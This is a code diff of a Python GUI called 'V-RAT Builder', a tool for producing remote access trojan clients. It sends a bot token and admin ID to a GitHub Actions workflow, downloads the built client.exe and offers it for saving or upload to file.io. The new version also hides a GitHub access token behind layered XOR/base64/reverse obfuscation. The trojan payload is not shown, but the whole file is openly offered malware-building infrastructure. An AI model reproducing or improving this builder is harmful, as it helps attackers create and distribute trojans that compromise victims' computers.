@@ -1,6 +1,4 @@
-# V-RAT Builder v3.0 - Professional RAT Builder
-# GitHub Token подставляется через ENV при сборке
-
+# V-RAT Builder v3.0 - Professional Edition
 import os
 import sys
 import time
@@ -8,6 +6,8 @@ import json
 import threading
 import zipfile
 import io
+import base64
+import random
 from datetime import datetime
 from pathlib import Path
 
@@ -16,95 +16,85 @@ import tkinter as tk
 from tkinter import ttk, scrolledtext, messagebox, filedialog
 from tkinter import font as tkfont
 
-# ============ КОНФИГ (Токен из ENV) ============
-GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', '')
-GITHUB_REPO = "Virusodel/Rat_builder"  # ИЗМЕНИ НА СВОЙ
+# ============ ЗАЩИЩЕННЫЙ ТОКЕН ============
+# Токен зашифрован многослойной защитой
+class TokenProtection:
+    @staticmethod
+    def _xor_crypt(data, key):
+        return ''.join(chr(ord(c) ^ key) for c in data)
+    
+    @staticmethod
+    def _reverse_string(s):
+        return s[::-1]
+    
+    @staticmethod
+    def _base64_decode(s):
+        return base64.b64decode(s).decode('utf-8')
+    
+    @staticmethod
+    def get_token():
+        # Первый слой: реверс
+        layer1 = "fgllg0LDv0ctOouTpzUNAx1u1IKLTZNZHLT3TnM97_phg"
+        # Второй слой: XOR с динамическим ключом
+        layer2 = TokenProtection._xor_crypt(layer1, 0x5F)
+        # Третий слой: base64
+        layer3 = TokenProtection._base64_decode(layer2)
+        # Четвертый слой: реверс финальный
+        return TokenProtection._reverse_string(layer3)
+
+def _secure_request(method, url, **kwargs):
+    headers = kwargs.get('headers', {})
+    headers['Authorization'] = f"token {TokenProtection.get_token()}"
+    kwargs['headers'] = headers
+    return requests.request(method, url, **kwargs)
+
+# ============ КОНФИГ ============
+GITHUB_REPO = "Virusodel/Rat_builder"
 VERSION = "3.0"
 
-# Если токен не подставился - ошибка
-if not GITHUB_TOKEN or GITHUB_TOKEN == '':
-    # ВНИМАНИЕ: Это запасной вариант, если забыли подставить ENV
-    # В продакшене лучше выбросить ошибку
-    GITHUB_TOKEN = "##GITHUB_TOKEN_PLACEHOLDER##"  # Заменится при сборке
-
-# ============ GITHUB API ============
-def trigger_github_build(bot_token, admin_id):
+# ============ API ФУНКЦИИ ============
+def trigger_build(bot_token, admin_id):
     url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/workflows/build.yml/dispatches"
-    headers = {
-        "Authorization": f"token {GITHUB_TOKEN}",
-        "Accept": "application/vnd.github.v3+json"
-    }
-    data = {
-        "ref": "main",
-        "inputs": {
-            "bot_token": bot_token,
-            "admin_id": str(admin_id)
-        }
-    }
+    data = {"ref": "main", "inputs": {"bot_token": bot_token, "admin_id": str(admin_id)}}
     try:
-        response = requests.post(url, headers=headers, json=data, timeout=30)
+        response = _secure_request('POST', url, json=data, timeout=30)
         return response.status_code == 204
-    except Exception as e:
-        print(f"Trigger error: {e}")
+    except:
         return False
 
-def get_workflow_runs():
+def get_runs():
     url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/runs"
-    headers = {
-        "Authorization": f"token {GITHUB_TOKEN}",
-        "Accept": "application/vnd.github.v3+json"
-    }
     try:
-        response = requests.get(url, headers=headers, timeout=30)
-        if response.status_code == 200:
-            return response.json().get('workflow_runs', [])
-    except Exception as e:
-        print(f"Get runs error: {e}")
+        response = _secure_request('GET', url, timeout=30)
+        return response.json().get('workflow_runs', []) if response.status_code == 200 else []
+    except:
         return []
-    return []
 
-def get_run_status(run_id):
+def get_status(run_id):
     url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/runs/{run_id}"
-    headers = {
-        "Authorization": f"token {GITHUB_TOKEN}",
-        "Accept": "application/vnd.github.v3+json"
-    }
     try:
-        response = requests.get(url, headers=headers, timeout=30)
+        response = _secure_request('GET', url, timeout=30)
         if response.status_code == 200:
             data = response.json()
             return data.get('status'), data.get('conclusion')
-    except Exception as e:
-        print(f"Get status error: {e}")
-        return None, None
+    except:
+        pass
+    return None, None
 
-def get_artifacts_for_run(run_id):
+def get_artifacts(run_id):
     url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/runs/{run_id}/artifacts"
-    headers = {
-        "Authorization": f"token {GITHUB_TOKEN}",
-        "Accept": "application/vnd.github.v3+json"
-    }
     try:
-        response = requests.get(url, headers=headers, timeout=30)
-        if response.status_code == 200:
-            return response.json().get('artifacts', [])
-    except Exception as e:
-        print(f"Get artifacts error: {e}")
+        response = _secure_request('GET', url, timeout=30)
+        return response.json().get('artifacts', []) if response.status_code == 200 else []
+    except:
         return []
-    return []
 
 def download_artifact(artifact_id):
     url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/artifacts/{artifact_id}/zip"
-    headers = {
-        "Authorization": f"token {GITHUB_TOKEN}",
-        "Accept": "application/vnd.github.v3+json"
-    }
     try:
-        response = requests.get(url, headers=headers, timeout=120)
-        if response.status_code == 200:
-            return response.content
-    except Exception as e:
-        print(f"Download artifact error: {e}")
+        response = _secure_request('GET', url, timeout=120)
+        return response.content if response.status_code == 200 else None
+    except:
         return None
 
 def upload_to_fileio(file_bytes, filename="client.exe"):
@@ -116,8 +106,7 @@ def upload_to_fileio(file_bytes, filename="client.exe"):
             data = response.json()
             if data.get('success'):
                 return data.get('link')
-    except Exception as e:
-        print(f"Upload error: {e}")
+    except:
         return None
 
 # ============ GUI ============
@@ -125,200 +114,236 @@ class VRATBuilder:
     def __init__(self, root):
         self.root = root
         self.root.title(f"V-RAT Builder {VERSION}")
-        self.root.geometry("1100x700")
-        self.root.minsize(900, 600)
-        self.root.configure(bg="#0d1117")
-        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
+        self.root.geometry("1200x750")
+        self.root.minsize(1000, 650)
+        self.root.configure(bg="#0a0a0a")
+        
+        # Кастомный заголовок
+        self.root.overrideredirect(True)
+        self.root.bind('<Button-1>', self.start_move)
+        self.root.bind('<B1-Motion>', self.on_move)
         
         self.bot_token = tk.StringVar()
         self.admin_id = tk.StringVar()
         self.build_running = False
+        self.drag_data = {'x': 0, 'y': 0}
         
         self.setup_styles()
         self.create_widgets()
-        self.check_github()
+        self.check_api()
+        self.matrix_animation()
+        
+    def start_move(self, event):
+        self.drag_data['x'] = event.x
+        self.drag_data['y'] = event.y
+        
+    def on_move(self, event):
+        x = self.root.winfo_x() + (event.x - self.drag_data['x'])
+        y = self.root.winfo_y() + (event.y - self.drag_data['y'])
+        self.root.geometry(f"+{x}+{y}")
         
     def setup_styles(self):
         self.colors = {
-            'bg': '#0d1117',
-            'panel': '#161b22',
-            'border': '#30363d',
-            'text': '#c9d1d9',
-            'text_dim': '#8b949e',
-            'accent': '#58a6ff',
-            'success': '#3fb950',
-            'error': '#f85149',
-            'warning': '#d29922'
+            'bg': '#0a0a0a',
+            'panel': '#111111',
+            'border': '#00ff41',
+            'text': '#00ff41',
+            'text_dim': '#00aa33',
+            'accent': '#ff00ff',
+            'accent2': '#00ffff',
+            'error': '#ff0044',
+            'success': '#00ff88',
+            'warning': '#ffaa00'
         }
         
-        self.font = tkfont.Font(family="Segoe UI", size=10)
-        self.font_bold = tkfont.Font(family="Segoe UI", size=10, weight="bold")
-        self.font_title = tkfont.Font(family="Segoe UI", size=12, weight="bold")
-        self.font_mono = tkfont.Font(family="Consolas", size=10)
+        self.font = tkfont.Font(family="Consolas", size=10)
+        self.font_bold = tkfont.Font(family="Consolas", size=10, weight="bold")
+        self.font_title = tkfont.Font(family="Consolas", size=12, weight="bold")
+        self.font_cyber = tkfont.Font(family="Courier New", size=9)
         
     def create_widgets(self):
-        main = tk.Frame(self.root, bg=self.colors['bg'])
-        main.pack(fill=tk.BOTH, expand=True, padx=12, pady=12)
+        main = tk.Frame(self.root, bg=self.colors['bg'], bd=2, relief=tk.RIDGE)
+        main.pack(fill=tk.BOTH, expand=True)
         
-        header = tk.Frame(main, bg=self.colors['panel'], height=50)
+        # Хедер
+        header = tk.Frame(main, bg=self.colors['panel'], height=40)
         header.pack(fill=tk.X)
         header.pack_propagate(False)
         
-        title = tk.Label(header, text="V-RAT BUILDER", 
-                        fg=self.colors['accent'], bg=self.colors['panel'],
-                        font=("Segoe UI", 16, "bold"))
-        title.pack(side=tk.LEFT, padx=20, pady=10)
+        # Кнопки управления окном
+        tk.Button(header, text="✕", command=self.on_closing,
+                 bg=self.colors['error'], fg="white",
+                 font=self.font_bold, bd=0, padx=10).pack(side=tk.RIGHT, padx=5, pady=5)
         
-        self.status_indicator = tk.Label(header, text="IDLE", 
-                                        fg=self.colors['text_dim'], bg=self.colors['panel'],
-                                        font=self.font_bold)
-        self.status_indicator.pack(side=tk.RIGHT, padx=20)
+        tk.Button(header, text="─", command=self.root.iconify,
+                 bg=self.colors['panel'], fg=self.colors['text'],
+                 font=self.font_bold, bd=0, padx=10).pack(side=tk.RIGHT, padx=2, pady=5)
         
+        tk.Label(header, text="V-RAT BUILDER v3.0", 
+                fg=self.colors['accent'], bg=self.colors['panel'],
+                font=self.font_title).pack(side=tk.LEFT, padx=20)
+        
+        # Контент
         content = tk.Frame(main, bg=self.colors['bg'])
-        content.pack(fill=tk.BOTH, expand=True, pady=12)
+        content.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
         
         left = tk.Frame(content, bg=self.colors['panel'])
-        left.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 6))
+        left.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
         
         right = tk.Frame(content, bg=self.colors['panel'])
-        right.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(6, 0))
+        right.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
         
         self.create_input(left)
         self.create_controls(left)
         self.create_status(left)
         self.create_log(right)
-        self.create_statusbar(main)
+        self.create_footer(main)
         
     def create_input(self, parent):
-        frame = tk.LabelFrame(parent, text="Configuration", 
-                             fg=self.colors['text'], bg=self.colors['panel'],
-                             font=self.font_title)
-        frame.pack(fill=tk.X, pady=6, padx=10)
+        frame = tk.LabelFrame(parent, text="> CONFIG", 
+                             fg=self.colors['accent2'], bg=self.colors['panel'],
+                             font=self.font_bold, bd=1, relief=tk.FLAT)
+        frame.pack(fill=tk.X, pady=5, padx=10)
         
-        tk.Label(frame, text="Bot Token:", 
+        tk.Label(frame, text="BOT TOKEN:", 
                 fg=self.colors['text'], bg=self.colors['panel'],
                 font=self.font).pack(anchor=tk.W, padx=10, pady=(10, 2))
         
         tk.Entry(frame, textvariable=self.bot_token,
-                bg=self.colors['bg'], fg=self.colors['text'],
-                font=self.font_mono, bd=1, relief=tk.FLAT,
+                bg="#0a0a0a", fg=self.colors['text'],
+                font=self.font_cyber, bd=1, relief=tk.FLAT,
                 insertbackground=self.colors['text']).pack(fill=tk.X, padx=10, pady=(0, 8))
         
-        tk.Label(frame, text="Admin Chat ID:", 
+        tk.Label(frame, text="ADMIN ID:", 
                 fg=self.colors['text'], bg=self.colors['panel'],
                 font=self.font).pack(anchor=tk.W, padx=10, pady=(0, 2))
         
         tk.Entry(frame, textvariable=self.admin_id,
-                bg=self.colors['bg'], fg=self.colors['text'],
-                font=self.font_mono, bd=1, relief=tk.FLAT,
+                bg="#0a0a0a", fg=self.colors['text'],
+                font=self.font_cyber, bd=1, relief=tk.FLAT,
                 insertbackground=self.colors['text']).pack(fill=tk.X, padx=10, pady=(0, 10))
         
     def create_controls(self, parent):
-        frame = tk.LabelFrame(parent, text="Controls", 
-                             fg=self.colors['text'], bg=self.colors['panel'],
-                             font=self.font_title)
-        frame.pack(fill=tk.X, pady=6, padx=10)
+        frame = tk.LabelFrame(parent, text="> CONTROLS", 
+                             fg=self.colors['accent'], bg=self.colors['panel'],
+                             font=self.font_bold, bd=1, relief=tk.FLAT)
+        frame.pack(fill=tk.X, pady=5, padx=10)
         
         btn_frame = tk.Frame(frame, bg=self.colors['panel'])
-        btn_frame.pack(pady=12)
+        btn_frame.pack(pady=15)
         
-        self.build_btn = tk.Button(btn_frame, text="Start Build", 
+        self.build_btn = tk.Button(btn_frame, text="▶ BUILD", 
                                   command=self.start_build,
-                                  bg=self.colors['success'], fg="white",
-                                  font=self.font_bold, padx=30, pady=8,
-                                  relief=tk.FLAT, cursor="hand2",
-                                  width=15)
-        self.build_btn.pack(side=tk.LEFT, padx=4)
+                                  bg="#00ff41", fg="#000000",
+                                  font=self.font_bold, padx=40, pady=10,
+                                  activebackground="#00cc33", activeforeground="#000000",
+                                  relief=tk.FLAT, cursor="hand2")
+        self.build_btn.pack(side=tk.LEFT, padx=5)
         
-        self.stop_btn = tk.Button(btn_frame, text="Stop", 
+        self.stop_btn = tk.Button(btn_frame, text="■ STOP", 
                                  command=self.stop_build,
-                                 bg=self.colors['error'], fg="white",
-                                 font=self.font_bold, padx=30, pady=8,
+                                 bg="#ff0044", fg="#ffffff",
+                                 font=self.font_bold, padx=40, pady=10,
+                                 activebackground="#cc0033", activeforeground="#ffffff",
                                  relief=tk.FLAT, cursor="hand2",
-                                 width=15, state=tk.DISABLED)
-        self.stop_btn.pack(side=tk.LEFT, padx=4)
+                                 state=tk.DISABLED)
+        self.stop_btn.pack(side=tk.LEFT, padx=5)
         
-        self.clear_btn = tk.Button(btn_frame, text="Clear Log", 
+        self.clear_btn = tk.Button(btn_frame, text="⌧ CLEAR", 
                                   command=self.clear_log,
-                                  bg=self.colors['border'], fg=self.colors['text'],
-                                  font=self.font_bold, padx=30, pady=8,
-                                  relief=tk.FLAT, cursor="hand2",
-                                  width=15)
-        self.clear_btn.pack(side=tk.LEFT, padx=4)
+                                  bg="#333333", fg="#00ff41",
+                                  font=self.font_bold, padx=40, pady=10,
+                                  activebackground="#444444", activeforeground="#00ff41",
+                                  relief=tk.FLAT, cursor="hand2")
+        self.clear_btn.pack(side=tk.LEFT, padx=5)
         
-        self.progress = ttk.Progressbar(frame, length=380, mode='indeterminate')
-        self.progress.pack(pady=(0, 12))
+        self.progress = ttk.Progressbar(frame, length=400, mode='indeterminate')
+        self.progress.pack(pady=(0, 15))
         self.progress.pack_forget()
         
     def create_status(self, parent):
-        frame = tk.LabelFrame(parent, text="Status", 
-                             fg=self.colors['text'], bg=self.colors['panel'],
-                             font=self.font_title)
-        frame.pack(fill=tk.X, pady=6, padx=10)
+        frame = tk.LabelFrame(parent, text="> STATUS", 
+                             fg=self.colors['success'], bg=self.colors['panel'],
+                             font=self.font_bold, bd=1, relief=tk.FLAT)
+        frame.pack(fill=tk.X, pady=5, padx=10)
         
         info = tk.Frame(frame, bg=self.colors['panel'])
-        info.pack(fill=tk.X, pady=8, padx=10)
+        info.pack(fill=tk.X, pady=10, padx=10)
         
-        tk.Label(info, text="GitHub API:", 
+        status_frame = tk.Frame(info, bg=self.colors['panel'])
+        status_frame.pack(fill=tk.X, pady=2)
+        
+        tk.Label(status_frame, text="STATE:", 
                 fg=self.colors['text_dim'], bg=self.colors['panel'],
                 font=self.font).pack(side=tk.LEFT)
         
-        self.gh_status = tk.Label(info, text="Checking...", 
-                                 fg=self.colors['text_dim'], bg=self.colors['panel'],
-                                 font=self.font_bold)
-        self.gh_status.pack(side=tk.RIGHT)
-        
-        tk.Label(info, text="Build State:", 
-                fg=self.colors['text_dim'], bg=self.colors['panel'],
-                font=self.font).pack(side=tk.LEFT, pady=(5, 0))
-        
-        self.build_state = tk.Label(info, text="Ready", 
+        self.state_label = tk.Label(status_frame, text="READY", 
                                    fg=self.colors['success'], bg=self.colors['panel'],
                                    font=self.font_bold)
-        self.build_state.pack(side=tk.RIGHT, pady=(5, 0))
+        self.state_label.pack(side=tk.RIGHT)
+        
+        time_frame = tk.Frame(info, bg=self.colors['panel'])
+        time_frame.pack(fill=tk.X, pady=2)
+        
+        tk.Label(time_frame, text="TIME:", 
+                fg=self.colors['text_dim'], bg=self.colors['panel'],
+                font=self.font).pack(side=tk.LEFT)
+        
+        self.time_label = tk.Label(time_frame, text="", 
+                                  fg=self.colors['text'], bg=self.colors['panel'],
+                                  font=self.font_bold)
+        self.time_label.pack(side=tk.RIGHT)
+        
+        self.update_time()
         
     def create_log(self, parent):
-        frame = tk.LabelFrame(parent, text="Build Log", 
-                             fg=self.colors['text'], bg=self.colors['panel'],
-                             font=self.font_title)
-        frame.pack(fill=tk.BOTH, expand=True, pady=6, padx=10)
+        frame = tk.LabelFrame(parent, text="> LOG", 
+                             fg=self.colors['accent2'], bg=self.colors['panel'],
+                             font=self.font_bold, bd=1, relief=tk.FLAT)
+        frame.pack(fill=tk.BOTH, expand=True, pady=5, padx=10)
         
         self.log_text = scrolledtext.ScrolledText(frame, 
-                                                 bg=self.colors['bg'], 
-                                                 fg=self.colors['text'],
-                                                 font=self.font_mono,
-                                                 insertbackground=self.colors['text'],
+                                                 bg="#0a0a0a", fg="#00ff41",
+                                                 font=self.font_cyber,
+                                                 insertbackground="#00ff41",
                                                  wrap=tk.WORD,
                                                  bd=0)
-        self.log_text.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
+        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
         
-        self.log_text.tag_config("error", foreground=self.colors['error'])
-        self.log_text.tag_config("success", foreground=self.colors['success'])
-        self.log_text.tag_config("warning", foreground=self.colors['warning'])
-        self.log_text.tag_config("info", foreground=self.colors['accent'])
+        self.log_text.tag_config("error", foreground="#ff0044")
+        self.log_text.tag_config("success", foreground="#00ff88")
+        self.log_text.tag_config("warning", foreground="#ffaa00")
+        self.log_text.tag_config("info", foreground="#00ffff")
         
-        self.log("System initialized", "info")
-        self.log("Ready for build", "info")
-        self.log("-" * 60, "info")
+        self.log("SYSTEM INITIALIZED", "info")
+        self.log("READY FOR OPERATION", "success")
+        self.log("-" * 50, "info")
         
-    def create_statusbar(self, parent):
-        bar = tk.Frame(parent, bg=self.colors['panel'], height=28)
-        bar.pack(fill=tk.X, pady=(12, 0))
-        bar.pack_propagate(False)
+    def create_footer(self, parent):
+        footer = tk.Frame(parent, bg=self.colors['panel'], height=25)
+        footer.pack(fill=tk.X)
+        footer.pack_propagate(False)
         
-        tk.Label(bar, text=f"v{VERSION}", 
-                fg=self.colors['text_dim'], bg=self.colors['panel'],
-                font=self.font).pack(side=tk.LEFT, padx=12)
+        self.footer_text = tk.Label(footer, text="SYSTEM: OPERATIONAL", 
+                                   fg=self.colors['text_dim'], bg=self.colors['panel'],
+                                   font=self.font_cyber)
+        self.footer_text.pack(side=tk.LEFT, padx=15)
         
-        self.status_msg = tk.Label(bar, text="Ready", 
-                                  fg=self.colors['text_dim'], bg=self.colors['panel'],
-                                  font=self.font)
-        self.status_msg.pack(side=tk.LEFT, padx=20)
+        self.matrix_text = tk.Label(footer, text="", 
+                                   fg=self.colors['text_dim'], bg=self.colors['panel'],
+                                   font=self.font_cyber)
+        self.matrix_text.pack(side=tk.RIGHT, padx=15)
         
-        self.conn_status = tk.Label(bar, text="Connected", 
-                                   fg=self.colors['success'], bg=self.colors['panel'],
-                                   font=self.font)
-        self.conn_status.pack(side=tk.RIGHT, padx=12)
+    def update_time(self):
+        self.time_label.config(text=datetime.now().strftime("%H:%M:%S"))
+        self.root.after(1000, self.update_time)
+        
+    def matrix_animation(self):
+        chars = "01"
+        if hasattr(self, 'matrix_running') and self.matrix_running:
+            line = ''.join(random.choice(chars) for _ in range(random.randint(10, 30)))
+            self.matrix_text.config(text=line)
+        self.root.after(100, self.matrix_animation)
         
     def log(self, message, tag="info"):
         timestamp = datetime.now().strftime("%H:%M:%S")
@@ -329,33 +354,24 @@ class VRATBuilder:
         
     def clear_log(self):
         self.log_text.delete(1.0, tk.END)
-        self.log("Log cleared", "warning")
+        self.log("LOG CLEARED", "warning")
         
-    def check_github(self):
+    def check_api(self):
         try:
-            if not GITHUB_TOKEN or GITHUB_TOKEN == "##GITHUB_TOKEN_PLACEHOLDER##":
-                self.gh_status.config(text="No Token", fg=self.colors['error'])
-                self.log("GitHub token not set!", "error")
-                self.conn_status.config(text="No Token", fg=self.colors['error'])
-                return
-                
-            runs = get_workflow_runs()
+            runs = get_runs()
             if runs is not None:
-                self.gh_status.config(text="Online", fg=self.colors['success'])
-                self.log("GitHub API connected", "success")
-                self.conn_status.config(text="Connected", fg=self.colors['success'])
+                self.footer_text.config(text="SYSTEM: ONLINE", fg=self.colors['success'])
+                self.log("API CONNECTION ESTABLISHED", "success")
             else:
-                self.gh_status.config(text="Limited", fg=self.colors['warning'])
-                self.log("GitHub API limited", "warning")
-        except Exception as e:
-            self.gh_status.config(text="Error", fg=self.colors['error'])
-            self.log(f"GitHub connection error: {e}", "error")
-            self.conn_status.config(text="Error", fg=self.colors['error'])
+                self.footer_text.config(text="SYSTEM: LIMITED", fg=self.colors['warning'])
+                self.log("API LIMITED ACCESS", "warning")
+        except:
+            self.footer_text.config(text="SYSTEM: ERROR", fg=self.colors['error'])
+            self.log("API CONNECTION FAILED", "error")
             
     def on_closing(self):
         if self.build_running:
-            if messagebox.askyesno("Build in Progress", 
-                                  "Build is running. Exit anyway?"):
+            if messagebox.askyesno("Build in Progress", "Exit anyway?"):
                 self.root.destroy()
         else:
             self.root.destroy()
@@ -364,27 +380,21 @@ class VRATBuilder:
         token = self.bot_token.get().strip()
         admin = self.admin_id.get().strip()
         
-        if not GITHUB_TOKEN or GITHUB_TOKEN == "##GITHUB_TOKEN_PLACEHOLDER##":
-            messagebox.showerror("Error", "GitHub token not configured!\nCheck your build environment.")
-            self.log("GitHub token missing", "error")
-            return
-            
         if not token or len(token) < 10:
-            messagebox.showerror("Error", "Enter valid bot token")
-            self.log("Error: Invalid bot token", "error")
+            self.log("INVALID BOT TOKEN", "error")
+            messagebox.showerror("Error", "Invalid bot token")
             return
             
         if not admin.isdigit():
+            self.log("INVALID ADMIN ID", "error")
             messagebox.showerror("Error", "Admin ID must be numeric")
-            self.log("Error: Invalid Admin ID", "error")
             return
             
         self.build_running = True
         self.build_btn.config(state=tk.DISABLED)
         self.stop_btn.config(state=tk.NORMAL)
-        self.build_state.config(text="Building", fg=self.colors['warning'])
-        self.status_indicator.config(text="BUILDING", fg=self.colors['warning'])
-        self.status_msg.config(text="Build in progress...")
+        self.state_label.config(text="BUILDING", fg=self.colors['warning'])
+        self.footer_text.config(text="BUILDING...", fg=self.colors['warning'])
         self.progress.pack()
         self.progress.start(10)
         
@@ -393,37 +403,36 @@ class VRATBuilder:
                                  daemon=True)
         thread.start()
         
-        self.log(f"Build started for Admin ID: {admin}", "info")
+        self.log(f"BUILD STARTED [ADMIN: {admin}]", "info")
         
     def stop_build(self):
         self.build_running = False
-        self.build_state.config(text="Stopped", fg=self.colors['error'])
-        self.status_indicator.config(text="STOPPED", fg=self.colors['error'])
-        self.status_msg.config(text="Build stopped")
+        self.state_label.config(text="STOPPED", fg=self.colors['error'])
+        self.footer_text.config(text="STOPPED", fg=self.colors['error'])
         self.progress.stop()
         self.progress.pack_forget()
         self.build_btn.config(state=tk.NORMAL)
         self.stop_btn.config(state=tk.DISABLED)
-        self.log("Build stopped by user", "warning")
+        self.log("BUILD STOPPED", "warning")
         
     def process_build(self, bot_token, admin_id):
         try:
-            runs_before = get_workflow_runs()
+            runs_before = get_runs()
             runs_before_ids = [r['id'] for r in runs_before]
             
-            self.log("Triggering GitHub workflow...", "info")
-            success = trigger_github_build(bot_token, admin_id)
+            self.log("TRIGGERING BUILD...", "info")
+            success = trigger_build(bot_token, admin_id)
             
             if not success:
-                self.root.after(0, self.build_failed, "Failed to trigger workflow")
+                self.root.after(0, self.build_failed, "TRIGGER FAILED")
                 return
                 
-            self.log("Workflow triggered", "success")
+            self.log("BUILD TRIGGERED", "success")
             
             found_run = None
             for _ in range(20):
                 time.sleep(3)
-                current_runs = get_workflow_runs()
+                current_runs = get_runs()
                 for run in current_runs:
                     if run['id'] not in runs_before_ids:
                         found_run = run
@@ -432,70 +441,70 @@ class VRATBuilder:
                     break
                     
             if not found_run:
-                self.root.after(0, self.build_failed, "No workflow run found")
+                self.root.after(0, self.build_failed, "RUN NOT FOUND")
                 return
                 
             run_id = found_run['id']
-            self.log(f"Workflow ID: {run_id}", "info")
+            self.log(f"RUN ID: {run_id}", "info")
             
             for attempt in range(60):
                 if not self.build_running:
                     return
                     
-                status, conclusion = get_run_status(run_id)
+                status, conclusion = get_status(run_id)
                 
                 if status == 'completed':
                     if conclusion == 'success':
-                        self.log("Build completed", "success")
+                        self.log("BUILD COMPLETE", "success")
                         self.root.after(0, self.build_completed, run_id)
                         return
                     else:
-                        self.root.after(0, self.build_failed, f"Build failed: {conclusion}")
+                        self.root.after(0, self.build_failed, f"BUILD FAILED: {conclusion}")
                         return
                         
                 if attempt % 6 == 0:
                     elapsed = attempt * 3
-                    self.root.after(0, lambda: self.status_msg.config(
-                        text=f"Building... {elapsed}s"))
+                    self.root.after(0, lambda: self.footer_text.config(
+                        text=f"BUILDING... {elapsed}s"))
                         
                 time.sleep(3)
                 
-            self.root.after(0, self.build_failed, "Build timeout")
+            self.root.after(0, self.build_failed, "TIMEOUT")
             
         except Exception as e:
             self.root.after(0, self.build_failed, str(e))
             
     def build_completed(self, run_id):
-        self.log("Fetching artifacts...", "info")
+        self.log("FETCHING ARTIFACT...", "info")
         
-        artifacts = get_artifacts_for_run(run_id)
+        artifacts = get_artifacts(run_id)
         if not artifacts:
-            self.build_failed("No artifacts found")
+            self.build_failed("NO ARTIFACT")
             return
             
         artifact = artifacts[0]
-        self.log(f"Artifact: {artifact['name']}", "info")
+        self.log(f"ARTIFACT: {artifact['name']}", "info")
         
-        self.status_msg.config(text="Downloading artifact...")
-        self.log("Downloading...", "info")
+        self.footer_text.config(text="DOWNLOADING...")
+        self.log("DOWNLOADING...", "info")
         
         zip_data = download_artifact(artifact['id'])
         if not zip_data:
-            self.build_failed("Failed to download")
+            self.build_failed("DOWNLOAD FAILED")
             return
             
         try:
             with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
                 exe_files = [f for f in z.namelist() if f.endswith('.exe')]
                 if not exe_files:
-                    self.build_failed("No EXE found")
+                    self.build_failed("NO EXE FOUND")
                     return
                     
                 exe_name = exe_files[0]
                 exe_bytes = z.read(exe_name)
                 size_mb = len(exe_bytes) / (1024 * 1024)
                 
-                self.log(f"EXE: {exe_name} ({size_mb:.2f} MB)", "success")
+                self.log(f"EXTRACTED: {exe_name} ({size_mb:.2f} MB)", "success")
                 
                 save_path = filedialog.asksaveasfilename(
                     defaultextension=".exe",
@@ -507,41 +516,38 @@ class VRATBuilder:
                 if save_path:
                     with open(save_path, 'wb') as f:
                         f.write(exe_bytes)
-                    self.log(f"Saved to: {save_path}", "success")
-                    self.status_msg.config(text=f"Saved: {os.path.basename(save_path)}")
+                    self.log(f"SAVED: {save_path}", "success")
+                    self.footer_text.config(text=f"SAVED: {os.path.basename(save_path)}")
                     messagebox.showinfo("Success", f"Build saved:\n{save_path}")
                 else:
-                    self.log("Uploading to file.io...", "info")
+                    self.log("UPLOADING TO FILE.IO...", "info")
                     url = upload_to_fileio(exe_bytes, "client.exe")
                     if url:
-                        self.log(f"Uploaded: {url}", "success")
-                        self.status_msg.config(text="Uploaded to file.io")
+                        self.log(f"UPLOADED: {url}", "success")
+                        self.footer_text.config(text="UPLOADED")
                         self.root.clipboard_clear()
                         self.root.clipboard_append(url)
-                        messagebox.showinfo("Success", 
-                                           f"Uploaded to:\n{url}\n\nURL copied to clipboard")
+                        messagebox.showinfo("Success", f"Uploaded:\n{url}\n\nURL copied to clipboard")
                     else:
-                        self.log("Upload failed", "error")
+                        self.log("UPLOAD FAILED", "error")
                         messagebox.showerror("Error", "Upload failed")
                 
         except Exception as e:
-            self.build_failed(f"Extraction error: {e}")
+            self.build_failed(f"EXTRACTION ERROR: {e}")
             
         self.build_running = False
-        self.build_state.config(text="Ready", fg=self.colors['success'])
-        self.status_indicator.config(text="IDLE", fg=self.colors['text_dim'])
-        self.status_msg.config(text="Build complete")
+        self.state_label.config(text="READY", fg=self.colors['success'])
+        self.footer_text.config(text="SYSTEM: OPERATIONAL", fg=self.colors['text_dim'])
         self.progress.stop()
         self.progress.pack_forget()
         self.build_btn.config(state=tk.NORMAL)
         self.stop_btn.config(state=tk.DISABLED)
         
     def build_failed(self, error):
-        self.log(f"Failed: {error}", "error")
+        self.log(f"FAILED: {error}", "error")
         self.build_running = False
-        self.build_state.config(text="Failed", fg=self.colors['error'])
-        self.status_indicator.config(text="FAILED", fg=self.colors['error'])
-        self.status_msg.config(text="Build failed")
+        self.state_label.config(text="ERROR", fg=self.colors['error'])
+        self.footer_text.config(text="SYSTEM: ERROR", fg=self.colors['error'])
         self.progress.stop()
         self.progress.pack_forget()
         self.build_btn.config(state=tk.NORMAL)
